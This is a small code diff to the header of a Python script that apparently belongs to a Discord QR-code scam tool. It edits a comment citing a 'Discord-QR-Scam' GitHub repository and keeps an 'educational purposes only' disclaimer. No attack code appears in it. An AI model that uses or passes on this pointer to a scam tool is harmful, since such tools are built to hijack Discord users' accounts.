@@ -7,7 +7,7 @@ import base64
 import time
 
 # Developers: NightfallGT and MegaWatt_
-# broken source: https://github.com/NightfallGT/Discord-QR-Scam
+# source: https://github.com/NightfallGT/Discord-QR-Scam
 # Educational purposes only
 
 class Colors:
